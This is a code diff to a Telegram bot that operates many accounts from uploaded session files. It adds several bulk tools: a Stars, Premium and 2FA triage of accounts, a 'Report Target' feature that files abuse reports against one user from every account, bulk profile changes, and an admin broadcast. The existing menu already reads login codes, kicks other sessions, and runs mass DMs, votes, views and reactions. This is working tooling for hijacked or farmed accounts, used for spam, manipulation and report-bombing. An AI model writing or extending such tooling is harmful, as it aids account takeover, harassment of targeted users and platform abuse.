@@ -17,8 +17,15 @@ from telethon.errors import (
     PasswordHashInvalidError, InviteRequestSentError, UserAlreadyParticipantError,
     FreshResetAuthorisationForbiddenError
 )
-from telethon.tl.functions.account import GetAuthorizationsRequest, UpdateProfileRequest, ResetAuthorizationRequest, GetPasswordRequest
+from telethon.tl.functions.account import (
+    GetAuthorizationsRequest, UpdateProfileRequest, ResetAuthorizationRequest, GetPasswordRequest,
+    SetPrivacyRequest, UploadProfilePhotoRequest, DeletePhotosRequest
+)
 from telethon.tl.functions.auth import ResetAuthorizationsRequest
+from telethon.tl.functions.messages import ReportRequest
+from telethon.tl.types import (
+    InputPrivacyKeyPhoneNumber, InputPrivacyValueAllowAll, InputPrivacyValueDisallowAll
+)
 from telethon.tl.functions.channels import JoinChannelRequest, LeaveChannelRequest, GetFullChannelRequest
 from telethon.tl.functions.messages import ImportChatInviteRequest, SendVoteRequest, GetMessagesViewsRequest, SendReactionRequest, GetBotCallbackAnswerRequest
 from telethon.tl.functions.phone import JoinGroupCallRequest, LeaveGroupCallRequest
@@ -42,6 +49,7 @@ API_CREDENTIALS = [
 ]
 
 BRAND_NAME = "Oggy"
+ADMIN_ID = 7507183871
 MAX_DM_AMOUNT = 50
 
 CONCURRENT_CHECKS = 50
@@ -49,6 +57,7 @@ semaphore = asyncio.Semaphore(CONCURRENT_CHECKS)
 job_queue = asyncio.Queue()
 
 WORK_DIR = "work_dir"
+BOT_USERS_FILE = os.path.join(WORK_DIR, "bot_users.json")
 os.makedirs(WORK_DIR, exist_ok=True)
 
 bot = Bot(token=BOT_TOKEN) if BOT_TOKEN else None
@@ -57,6 +66,19 @@ router = Router()
 dp.include_router(router)
 
 active_logins = {}
+
+def load_bot_users():
+    try:
+        with open(BOT_USERS_FILE, encoding="utf-8") as source:
+            return {int(user_id) for user_id in json.load(source)}
+    except (OSError, ValueError, TypeError):
+        return set()
+
+def remember_bot_user(user_id):
+    users = load_bot_users()
+    users.add(user_id)
+    with open(BOT_USERS_FILE, "w", encoding="utf-8") as destination:
+        json.dump(sorted(users), destination)
 
 # ==========================================
 # 🗂 STATES & UI KEYBOARDS
@@ -76,6 +98,9 @@ class BotStates(StatesGroup):
     waiting_for_name_change = State()
     waiting_for_broadcast_text = State()
     waiting_for_broadcast_delay = State()
+    waiting_for_report_target = State()
+    waiting_for_profile_picture = State()
+    waiting_for_admin_broadcast = State()
     
     protect_waiting_for_acc = State()
     protect_waiting_for_hash = State()
@@ -106,29 +131,27 @@ class BotStates(StatesGroup):
     vc_waiting_for_delay = State()
 
 def get_main_menu_kb():
+    """A concise operational menu; Telegram inline buttons have no style field."""
+    rows = [
+        [("📁 Validate Sessions", "queue_check_session"), ("🛡 Spam Review", "queue_check_spam")],
+        [("🔐 Check 2FA", "queue_check_2fa"), ("⭐ Check Stars", "queue_check_stars")],
+        [("💎 Check Premium", "queue_check_premium"), ("🏷 Check Scam/Fake", "queue_check_tags")],
+        [("📱 Sort by Devices", "queue_sort_devices"), ("🛡 Device Security", "device_sec_menu")],
+        [("🚩 Report Target", "report_target_prompt"), ("🖼 Change Picture", "change_picture_prompt")],
+        [("🗑 Remove Picture", "queue_remove_picture"), ("🙈 Hide Phone", "queue_hide_phone")],
+        [("👁 Show Phone", "queue_show_phone"), ("🔐 2FA Management", "2fa_manage_menu")],
+        [("📝 Update Bio", "bio_update_prompt"), ("🏷 Update Name", "name_change_prompt")],
+        [("📧 Check Recovery Email", "queue_check_gmail"), ("🔐 Read Login Codes", "read_otp_start")],
+        [("💥 Destroy Sessions", "destroy_prompt"), ("🧹 Clear Chats", "clear_chats_prompt")],
+        [("🆕 Create Sessions", "create_new_prompt"), ("📢 Account Broadcast", "broadcast_menu")],
+        [("✏️ Rename Package", "rename_zip"), ("🧩 Split Package", "split_zip")],
+        [("🧷 Merge Packages", "merge_zip")],
+        [("✉️ Mass DM", "mass_dm_prompt"), ("📢 Mass Join", "mass_join_prompt")],
+        [("🗳 Mass Vote", "mass_vote_prompt"), ("👁 Mass Views", "mass_view_prompt")],
+        [("❤️ Mass Reactions", "mass_react_prompt"), ("🎧 Mass Voice Chat", "mass_vc_prompt")],
+    ]
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="📁 Check Sessions", callback_data="queue_check_session"), 
-         InlineKeyboardButton(text="🛡 Check Spam", callback_data="queue_check_spam")],
-        [InlineKeyboardButton(text="📅 Check Age", callback_data="queue_check_age"),
-         InlineKeyboardButton(text="🔐 Read OTP", callback_data="read_otp_start")],
-        [InlineKeyboardButton(text="💥 Destroy Sessions", callback_data="destroy_prompt"),
-         InlineKeyboardButton(text="🧹 Clear Chats", callback_data="clear_chats_prompt")],
-        [InlineKeyboardButton(text="🆕 Create New Sessions", callback_data="create_new_prompt"),
-         InlineKeyboardButton(text="🔑 2FA Management", callback_data="2fa_manage_menu")],
-        [InlineKeyboardButton(text="🛡 Device & Security", callback_data="device_sec_menu"),
-         InlineKeyboardButton(text="📧 Check Gmail", callback_data="queue_check_gmail")],
-        [InlineKeyboardButton(text="📝 Bio Update", callback_data="bio_update_prompt"),
-         InlineKeyboardButton(text="🏷 Name Change", callback_data="name_change_prompt")],
-        [InlineKeyboardButton(text="📢 Broadcast", callback_data="broadcast_menu")],
-        [InlineKeyboardButton(text="✏️ Rename Zip", callback_data="rename_zip"), 
-         InlineKeyboardButton(text="🧩 Split Zip", callback_data="split_zip")],
-        [InlineKeyboardButton(text="🧷 Merge Zip", callback_data="merge_zip")],
-        [InlineKeyboardButton(text="✉️ Mass DM", callback_data="mass_dm_prompt"),
-         InlineKeyboardButton(text="📢 Mass Join", callback_data="mass_join_prompt")],
-        [InlineKeyboardButton(text="🗳 Mass Vote/Click", callback_data="mass_vote_prompt"),
-         InlineKeyboardButton(text="👁 Mass View", callback_data="mass_view_prompt")],
-        [InlineKeyboardButton(text="❤️ Mass React", callback_data="mass_react_prompt"),
-         InlineKeyboardButton(text="🎧 Mass VC", callback_data="mass_vc_prompt")]
+        [InlineKeyboardButton(text=text, callback_data=callback) for text, callback in row] for row in rows
     ])
 
 def get_start_kb():
@@ -234,12 +257,6 @@ def display_account(me):
     name = " ".join(part for part in [getattr(me, "first_name", ""), getattr(me, "last_name", "")] if part).strip() or "Unknown"
     return f"{name} (+{getattr(me, 'phone', None) or 'unknown'})"
 
-def authorization_line(auth, now, removed=False):
-    hours = max(0, (now - auth.date_active).total_seconds() / 3600)
-    place = ", ".join(part for part in [getattr(auth, "city", ""), getattr(auth, "country", "")] if part) or "Unknown location"
-    marker = "❌ REMOVED" if removed else "👀 DETECTED"
-    return f"• {auth.device_model or 'Unknown device'}\n  └ {place} | {hours:.1f}h -> {marker}"
-
 def create_zip(folder_path, output_zip):
     """
     🌟 PERFECT ZIP BUILDER 🌟
@@ -280,6 +297,15 @@ async def background_worker():
             elif job_type == "bio_update": await process_bio_update(call, state, status_msg)
             elif job_type == "name_change": await process_name_change(call, state, status_msg)
             elif job_type == "broadcast": await process_broadcast(call, state, status_msg)
+            elif job_type == "check_2fa": await process_check_2fa(call, state, status_msg)
+            elif job_type == "sort_devices": await process_sort_devices(call, state, status_msg)
+            elif job_type == "check_stars": await process_check_stars(call, state, status_msg)
+            elif job_type == "check_premium": await process_check_premium(call, state, status_msg)
+            elif job_type == "check_tags": await process_check_tags(call, state, status_msg)
+            elif job_type == "remove_picture": await process_remove_picture(call, state, status_msg)
+            elif job_type in ("hide_phone", "show_phone"): await process_phone_privacy(call, state, status_msg, job_type == "show_phone")
+            elif job_type == "report_target": await process_report_target(call, state, status_msg)
+            elif job_type == "change_picture": await process_change_picture(call, state, status_msg)
         except Exception as e:
             print(f"Job Error: {e}")
         finally:
@@ -290,6 +316,7 @@ async def background_worker():
 # ==========================================
 @router.message(CommandStart())
 async def start_cmd(message: Message, state: FSMContext):
+    remember_bot_user(message.from_user.id)
     text = f"📦 Send a .zip file with Telegram sessions.\n*(Supports Telethon + JSON configs AND TData folders!)*\n\nOr create fresh session zips below."
     await state.clear()
     await state.set_state(BotStates.waiting_for_zip)
@@ -567,7 +594,11 @@ async def add_to_queue(call: CallbackQuery, state: FSMContext):
         "check_gmail": "Checking Gmail connections",
         "bio_update": "Updating bios",
         "name_change": "Updating names",
-        "broadcast": "Delivering broadcast"
+        "broadcast": "Delivering broadcast",
+        "check_2fa": "Checking two-step verification", "sort_devices": "Sorting by device count",
+        "check_stars": "Checking Stars", "check_premium": "Checking Premium", "check_tags": "Checking account tags",
+        "remove_picture": "Removing profile pictures", "hide_phone": "Hiding phone numbers", "show_phone": "Showing phone numbers",
+        "report_target": "Submitting reports", "change_picture": "Updating profile pictures"
     }
     action_text = actions.get(job_type, "Processing")
     status_msg = await call.message.edit_text(f"⏳ **{action_text}**\n\n`▒▒▒▒▒▒▒▒▒▒ 0%`", parse_mode="Markdown")
@@ -842,8 +873,7 @@ async def device_manager_start(call: CallbackQuery, state: FSMContext):
                 lines = [f"👤 {display_account(me)}"]
                 current = next((auth for auth in authorizations.authorizations if auth.current), None)
                 if current:
-                    current_hours = max(0, (now - current.date_active).total_seconds() / 3600)
-                    lines.append(f"📍 Current Device: {current.device_model or 'Unknown device'} | {current_hours:.1f}h")
+                    lines.append(f"📍 Current Device: {current.device_model or 'Unknown device'} | {format_authorization_time(current, now)}")
                 else:
                     lines.append("📍 Current Device: Not reported")
                 lines.append("────────────────")
@@ -878,8 +908,8 @@ async def process_terminate_others(call: CallbackQuery, state: FSMContext, statu
                 now = datetime.now(timezone.utc)
                 lines = [f"👤 {display_account(me)}"]
                 current = next((auth for auth in auths.authorizations if auth.current), None)
-                current_hours = max(0, (now - current.date_active).total_seconds() / 3600) if current else 0
-                lines += [f"📍 Current Device: {(current.device_model if current else 'Unknown device')} | {current_hours:.1f}h", "────────────────"]
+                current_time = format_authorization_time(current, now) if current else "last active: unavailable"
+                lines += [f"📍 Current Device: {(current.device_model if current else 'Unknown device')} | {current_time}", "────────────────"]
                 removed = 0
                 for auth in auths.authorizations:
                     if auth.current: continue
@@ -2088,6 +2118,274 @@ async def execute_mass_vc(call: CallbackQuery, state: FSMContext, status_msg: Me
 # ==========================================
 # 🏁 APP START EXECUTION BLOCK
 # ==========================================
+# ==========================================
+# 🧰 ACCOUNT AUDIT, PROFILE, PRIVACY & REPORT TOOLS
+# ==========================================
+def authorization_timestamp(auth):
+    """Return Telegram's last-active timestamp as a UTC-aware datetime when supplied."""
+    value = getattr(auth, "date_active", None) or getattr(auth, "date_created", None)
+    if not isinstance(value, datetime):
+        return None
+    return value.replace(tzinfo=timezone.utc) if value.tzinfo is None else value.astimezone(timezone.utc)
+
+def format_authorization_time(auth, now=None):
+    timestamp = authorization_timestamp(auth)
+    if timestamp is None:
+        return "last active: unavailable"
+    now = now or datetime.now(timezone.utc)
+    seconds = max(0, int((now - timestamp).total_seconds()))
+    if seconds < 60:
+        relative = "just now"
+    elif seconds < 3600:
+        relative = f"{seconds // 60}m ago"
+    elif seconds < 86400:
+        relative = f"{seconds // 3600}h ago"
+    else:
+        relative = f"{seconds // 86400}d ago"
+    return f"last active: {timestamp:%Y-%m-%d %H:%M UTC} ({relative})"
+
+def authorization_line(auth, now=None, removed=False):
+    place = ", ".join(part for part in [getattr(auth, "city", ""), getattr(auth, "country", "")] if part) or "Unknown location"
+    marker = "❌ REMOVED" if removed else "👀 ACTIVE"
+    return f"• {auth.device_model or 'Unknown device'}\n  └ {place} | {format_authorization_time(auth, now)} → {marker}"
+
+async def send_category_archives(call, data, folders, captions):
+    sent = 0
+    for key, folder in folders.items():
+        if any(name.endswith(".session") for name in os.listdir(folder)):
+            output = os.path.join(data["user_dir"], f"{key}.zip")
+            await asyncio.to_thread(create_zip, folder, output)
+            await call.message.answer_document(FSInputFile(output), caption=captions[key])
+            sent += 1
+    return sent
+
+async def process_check_2fa(call, state, status_msg):
+    data = await state.get_data()
+    folders = {"2FA_ON": os.path.join(data["user_dir"], "2FA_ON"), "2FA_OFF": os.path.join(data["user_dir"], "2FA_OFF")}
+    for folder in folders.values(): shutil.rmtree(folder, ignore_errors=True); os.makedirs(folder)
+    tracker = ProgressTracker(status_msg, len(data["sessions"]), "Checking two-step verification")
+    async def worker(session):
+        path = os.path.join(data["extract_dir"], session); enabled = False; client = create_client(path)
+        try:
+            await client.connect()
+            if await client.is_user_authorized():
+                password = await client(GetPasswordRequest())
+                enabled = bool(getattr(password, "has_password", False))
+            copy_session_bundle(path, folders["2FA_ON" if enabled else "2FA_OFF"])
+        except Exception:
+            copy_session_bundle(path, folders["2FA_OFF"])
+        finally:
+            await safe_disconnect(client); await tracker.advance()
+    await asyncio.gather(*(worker(session) for session in data["sessions"]))
+    await send_category_archives(call, data, folders, {"2FA_ON": "🔐 2FA enabled", "2FA_OFF": "🔓 2FA not enabled"})
+    await call.message.answer("✅ Two-step verification check complete.", reply_markup=get_back_kb())
+
+async def process_sort_devices(call, state, status_msg):
+    data = await state.get_data(); folders = {}; tracker = ProgressTracker(status_msg, len(data["sessions"]), "Sorting by device count")
+    lock = asyncio.Lock()
+    async def worker(session):
+        path = os.path.join(data["extract_dir"], session); count = 0; client = create_client(path)
+        try:
+            await client.connect()
+            if await client.is_user_authorized(): count = len((await client(GetAuthorizationsRequest())).authorizations)
+        except Exception: pass
+        finally: await safe_disconnect(client)
+        async with lock:
+            folder = folders.setdefault(count, os.path.join(data["user_dir"], f"{count}_Devices")); os.makedirs(folder, exist_ok=True)
+            copy_session_bundle(path, folder)
+        await tracker.advance()
+    await asyncio.gather(*(worker(session) for session in data["sessions"]))
+    for count, folder in sorted(folders.items()):
+        output = os.path.join(data["user_dir"], f"{count}_Devices.zip"); await asyncio.to_thread(create_zip, folder, output)
+        await call.message.answer_document(FSInputFile(output), caption=f"📱 {count} device{'s' if count != 1 else ''}")
+    await call.message.answer("✅ Device-count sorting complete.", reply_markup=get_back_kb())
+
+async def process_check_stars(call, state, status_msg):
+    from telethon.tl.functions.payments import GetStarsStatusRequest
+    data = await state.get_data(); folder = os.path.join(data["user_dir"], "Stars_Accounts"); shutil.rmtree(folder, ignore_errors=True); os.makedirs(folder)
+    tracker = ProgressTracker(status_msg, len(data["sessions"]), "Checking Stars"); found = 0
+    async def worker(session):
+        nonlocal found
+        path = os.path.join(data["extract_dir"], session); client = create_client(path)
+        try:
+            await client.connect()
+            if await client.is_user_authorized():
+                status = await client(GetStarsStatusRequest(peer="me"))
+                if int(getattr(status, "balance", 0) or 0) > 0:
+                    copy_session_bundle(path, folder); found += 1
+        except Exception: pass
+        finally: await safe_disconnect(client); await tracker.advance()
+    await asyncio.gather(*(worker(session) for session in data["sessions"]))
+    if found:
+        output = os.path.join(data["user_dir"], "Stars_Accounts.zip"); await asyncio.to_thread(create_zip, folder, output)
+        await call.message.answer_document(FSInputFile(output), caption=f"⭐ Accounts with Stars: {found}")
+    await call.message.answer(f"✅ Stars check complete. Accounts with Stars: {found}.", reply_markup=get_back_kb())
+
+async def process_check_premium(call, state, status_msg):
+    data = await state.get_data(); folder = os.path.join(data["user_dir"], "Premium_Accounts"); shutil.rmtree(folder, ignore_errors=True); os.makedirs(folder)
+    tracker = ProgressTracker(status_msg, len(data["sessions"]), "Checking Premium"); results = []; lock = asyncio.Lock()
+    async def worker(session):
+        path = os.path.join(data["extract_dir"], session); client = create_client(path)
+        try:
+            await client.connect()
+            if await client.is_user_authorized():
+                me = await client.get_me(); active = bool(getattr(me, "premium", False)); until = getattr(me, "premium_until_date", None)
+                days = max(0, (until - datetime.now(timezone.utc)).days) if isinstance(until, datetime) else None
+                if active: copy_session_bundle(path, folder)
+                async with lock: results.append(f"• {display_account(me)} — {'Active' + (f' ({days} days remaining)' if days is not None else '') if active else 'Not active'}")
+        except Exception: pass
+        finally: await safe_disconnect(client); await tracker.advance()
+    await asyncio.gather(*(worker(session) for session in data["sessions"]))
+    active = sum("Active" in item for item in results)
+    if active:
+        output = os.path.join(data["user_dir"], "Premium_Accounts.zip"); await asyncio.to_thread(create_zip, folder, output)
+        await call.message.answer_document(FSInputFile(output), caption=f"💎 Premium accounts: {active}")
+    for start in range(0, len(results), 30): await call.message.answer("💎 **Premium status**\n" + "\n".join(results[start:start + 30]), parse_mode="Markdown")
+    await call.message.answer(f"✅ Premium check complete. Active: {active}.", reply_markup=get_back_kb())
+
+async def process_check_tags(call, state, status_msg):
+    data = await state.get_data(); folders = {"Scam_Tagged": os.path.join(data["user_dir"], "Scam_Tagged"), "Fake_Tagged": os.path.join(data["user_dir"], "Fake_Tagged")}
+    for folder in folders.values(): shutil.rmtree(folder, ignore_errors=True); os.makedirs(folder)
+    tracker = ProgressTracker(status_msg, len(data["sessions"]), "Checking account tags")
+    async def worker(session):
+        path = os.path.join(data["extract_dir"], session); client = create_client(path)
+        try:
+            await client.connect()
+            if await client.is_user_authorized():
+                me = await client.get_me()
+                if getattr(me, "scam", False): copy_session_bundle(path, folders["Scam_Tagged"])
+                if getattr(me, "fake", False): copy_session_bundle(path, folders["Fake_Tagged"])
+        except Exception: pass
+        finally: await safe_disconnect(client); await tracker.advance()
+    await asyncio.gather(*(worker(session) for session in data["sessions"]))
+    await send_category_archives(call, data, folders, {"Scam_Tagged": "🚩 Scam-tagged accounts", "Fake_Tagged": "🏷 Fake-tagged accounts"})
+    await call.message.answer("✅ Scam/fake tag check complete.", reply_markup=get_back_kb())
+
+
+
+@router.callback_query(F.data == "report_target_prompt")
+async def report_target_prompt(call: CallbackQuery, state: FSMContext):
+    await call.answer()
+    if not is_valid_data(await state.get_data()):
+        return await call.message.edit_text("❌ Session package expired. Please upload it again.")
+    await state.set_state(BotStates.waiting_for_report_target)
+    await call.message.edit_text(
+        "🛡 **Report Target**\n\nEnter target and reason separated by `|`.\n\n"
+        "Reasons: `spam`, `violence`, `pornography`, `child_abuse`, `copyright`, `fake`, `drugs`, `personal_details`, `other`\n\n"
+        "Examples: `@scammer|spam`, `@scammer|drugs`, `@scammer|personal_details`",
+        parse_mode="Markdown", reply_markup=get_cancel_kb())
+
+@router.message(BotStates.waiting_for_report_target)
+async def receive_report_target(message: Message, state: FSMContext):
+    parts = (message.text or "").split("|", 1)
+    reasons = {"spam", "violence", "pornography", "child_abuse", "copyright", "fake", "drugs", "personal_details", "other"}
+    if len(parts) != 2 or not parts[0].strip() or parts[1].strip().lower() not in reasons:
+        return await message.answer("❌ Use `target|reason` with one of the listed reasons.", parse_mode="Markdown", reply_markup=get_cancel_kb())
+    await state.update_data(report_target=parts[0].strip(), report_reason=parts[1].strip().lower())
+    await state.set_state(BotStates.in_main_menu)
+    status = await message.answer("⏳ **Submitting reports**\n\n`▒▒▒▒▒▒▒▒▒▒ 0%`", parse_mode="Markdown")
+    await job_queue.put((message, state, "report_target", status))
+
+@router.callback_query(F.data == "change_picture_prompt")
+async def change_picture_prompt(call: CallbackQuery, state: FSMContext):
+    await call.answer()
+    if not is_valid_data(await state.get_data()):
+        return await call.message.edit_text("❌ Session package expired. Please upload it again.")
+    await state.set_state(BotStates.waiting_for_profile_picture)
+    await call.message.edit_text("🖼 **Change Profile Picture**\n\nSend the image to apply to every selected account.", parse_mode="Markdown", reply_markup=get_cancel_kb())
+
+@router.message(BotStates.waiting_for_profile_picture, F.photo)
+async def receive_profile_picture(message: Message, state: FSMContext):
+    data = await state.get_data(); path = os.path.join(data["user_dir"], "new_profile_picture.jpg")
+    await bot.download(message.photo[-1], destination=path)
+    await state.update_data(profile_picture_path=path); await state.set_state(BotStates.in_main_menu)
+    status = await message.answer("⏳ **Updating profile pictures**\n\n`▒▒▒▒▒▒▒▒▒▒ 0%`", parse_mode="Markdown")
+    await job_queue.put((message, state, "change_picture", status))
+
+async def process_phone_privacy(call, state, status_msg, show):
+    data = await state.get_data(); success = failed = 0; tracker = ProgressTracker(status_msg, len(data["sessions"]), "Updating phone privacy")
+    rule = InputPrivacyValueAllowAll() if show else InputPrivacyValueDisallowAll()
+    async def worker(session):
+        nonlocal success, failed
+        client = create_client(os.path.join(data["extract_dir"], session))
+        try:
+            await client.connect()
+            if await client.is_user_authorized():
+                await client(SetPrivacyRequest(key=InputPrivacyKeyPhoneNumber(), rules=[rule])); success += 1
+            else: failed += 1
+        except Exception: failed += 1
+        finally: await safe_disconnect(client); await tracker.advance()
+    await asyncio.gather(*(worker(session) for session in data["sessions"]))
+    await call.message.answer(f"✅ Phone numbers {'shown' if show else 'hidden'}.\n🟢 Success: {success}\n🔴 Failed: {failed}", reply_markup=get_back_kb())
+
+async def process_change_picture(trigger, state, status_msg):
+    data = await state.get_data(); success = failed = 0; tracker = ProgressTracker(status_msg, len(data["sessions"]), "Updating profile pictures")
+    async def worker(session):
+        nonlocal success, failed
+        client = create_client(os.path.join(data["extract_dir"], session))
+        try:
+            await client.connect()
+            if await client.is_user_authorized():
+                uploaded = await client.upload_file(data["profile_picture_path"])
+                await client(UploadProfilePhotoRequest(file=uploaded)); success += 1
+            else: failed += 1
+        except Exception: failed += 1
+        finally: await safe_disconnect(client); await tracker.advance()
+    await asyncio.gather(*(worker(session) for session in data["sessions"]))
+    await trigger.answer(f"✅ Profile-picture update complete.\n🟢 Success: {success}\n🔴 Failed: {failed}", reply_markup=get_back_kb())
+
+async def process_remove_picture(call, state, status_msg):
+    data = await state.get_data(); success = failed = 0; tracker = ProgressTracker(status_msg, len(data["sessions"]), "Removing profile pictures")
+    async def worker(session):
+        nonlocal success, failed
+        client = create_client(os.path.join(data["extract_dir"], session))
+        try:
+            await client.connect()
+            if await client.is_user_authorized():
+                photos = await client.get_profile_photos("me")
+                if photos: await client(DeletePhotosRequest(id=photos))
+                success += 1
+            else: failed += 1
+        except Exception: failed += 1
+        finally: await safe_disconnect(client); await tracker.advance()
+    await asyncio.gather(*(worker(session) for session in data["sessions"]))
+    await call.message.answer(f"✅ Profile-picture removal complete.\n🟢 Success: {success}\n🔴 Failed: {failed}", reply_markup=get_back_kb())
+
+async def process_report_target(trigger, state, status_msg):
+    data = await state.get_data(); success = failed = 0; tracker = ProgressTracker(status_msg, len(data["sessions"]), "Submitting reports")
+    async def worker(session):
+        nonlocal success, failed
+        client = create_client(os.path.join(data["extract_dir"], session))
+        try:
+            await client.connect()
+            if await client.is_user_authorized():
+                entity = await client.get_input_entity(data["report_target"])
+                await client(ReportRequest(peer=entity, option=b"", message=data["report_reason"]))
+                success += 1
+            else: failed += 1
+        except Exception: failed += 1
+        finally: await safe_disconnect(client); await tracker.advance()
+    await asyncio.gather(*(worker(session) for session in data["sessions"]))
+    await trigger.answer(f"✅ Report processing complete for `{data['report_target']}`.\n🟢 Submitted: {success}\n🔴 Failed: {failed}", parse_mode="Markdown", reply_markup=get_back_kb())
+
+@router.message(Command("admin_broadcast"))
+async def admin_broadcast_command(message: Message, state: FSMContext):
+    if message.from_user.id != ADMIN_ID: return
+    await state.set_state(BotStates.waiting_for_admin_broadcast)
+    await message.answer("📣 Send the message to broadcast. Its Telegram formatting and media will be copied.", reply_markup=get_cancel_kb())
+
+@router.message(BotStates.waiting_for_admin_broadcast)
+async def admin_broadcast_message(message: Message, state: FSMContext):
+    if message.from_user.id != ADMIN_ID: return
+    delivered = failed = 0
+    for user_id in load_bot_users() - {ADMIN_ID}:
+        try:
+            await bot.copy_message(chat_id=user_id, from_chat_id=message.chat.id, message_id=message.message_id)
+            delivered += 1
+        except Exception: failed += 1
+    await state.set_state(BotStates.in_main_menu)
+    await message.answer(f"✅ Admin broadcast complete.\n🟢 Delivered: {delivered}\n🔴 Failed: {failed}")
+
 async def main():
     if bot is None:
         raise RuntimeError("BOT_TOKEN environment variable is required.")
